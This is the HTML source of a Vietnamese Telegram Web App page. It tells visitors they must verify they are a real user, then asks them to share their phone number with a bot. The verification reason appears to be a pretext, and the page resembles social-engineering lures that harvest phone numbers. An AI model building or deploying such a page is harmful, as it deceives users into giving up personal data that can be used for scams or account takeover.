<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }

/* nền ảnh */
.bg {
  position: fixed;
  width: 100%;
  height: 100%;
  background: url("https://sf-static.upanhlaylink.com/img/image_20260325f9888f2c477fd4a70251cff8ac50dce8.jpg") center/cover no-repeat;
  filter: blur(4px);
  transform: scale(1.05);
}

/* overlay mờ */
.overlay {
  position: fixed;
  width:100%; height:100%;
  background: rgba(0,0,0,0.25);
}

/* container căn giữa */
.container {
  position:absolute;
  top:50%;
  left:50%;
  transform: translate(-50%, -50%);
  text-align:center;
  display: inline-block;
}

/* icon vẫy tay */
.icon {
  font-size:170px;
  animation: wave 1.2s infinite;
}

@keyframes wave {
  0% { transform: rotate(0deg); }
  15% { transform: rotate(14deg); }
  30% { transform: rotate(-8deg); }
  45% { transform: rotate(14deg); }
  60% { transform: rotate(-4deg); }
  75% { transform: rotate(10deg); }
  100% { transform: rotate(0deg); }
}

/* text Step 1 & Step 2 */
.step-text {
  display:inline-block;
  margin-top:20px;
  padding:10px 15px; /* ô vừa chữ */
  border-radius:12px;
  background: rgba(255,255,255,0.9);
  font-size:17px;
  font-weight:500;
  color:#111;
  line-height:1.4;
  text-align:center;
  white-space: pre; /* giữ xuống dòng y hệt */
}

/* nút Xác nhận / Share số */
.step-btn {
  margin-top:15px;
  padding:12px 0;
  font-size:17px;
  font-weight:600;
  border:none;
  border-radius:12px;
  background:#3b9edb;
  color:#fff;
  cursor:pointer;
  display:inline-block;
  width:100%;
}

/* Step2 ẩn lúc đầu */
#step2 { display:none; }
</style>
</head>

<body>
<div class="bg"></div>
<div class="overlay"></div>

<div class="container">

  <!-- STEP 1 -->
  <div id="step1">
    <div class="icon">👋</div>
    <div class="step-text">
Bạn cần xác nhận mình là người dùng thật , hãy
     nhấp vào nút bên dưới để bắt đầu !
    </div>
    <button class="step-btn" onclick="showStep2()">Xác nhận</button>
  </div>

  <!-- STEP 2: Share số điện thoại -->
  <div id="step2">
    <div class="step-text">
📱 Vui lòng chia sẻ số điện thoại của bạn:
    </div>
    <button class="step-btn" onclick="sharePhone()">📲 Chia sẻ số điện thoại</button>
  </div>

</div>

<script>
let tg = window.Telegram.WebApp;
tg.expand();

// Hiện Step 2
function showStep2(){
  document.getElementById("step1").style.display = "none";
  document.getElementById("step2").style.display = "block";
}

// Gửi dữ liệu về bot khi share số
function sharePhone(){
  tg.sendData("request_phone");
  alert("Bấm nút share số trên Telegram để gửi số điện thoại của bạn!");
}
</script>
</body>
</html>
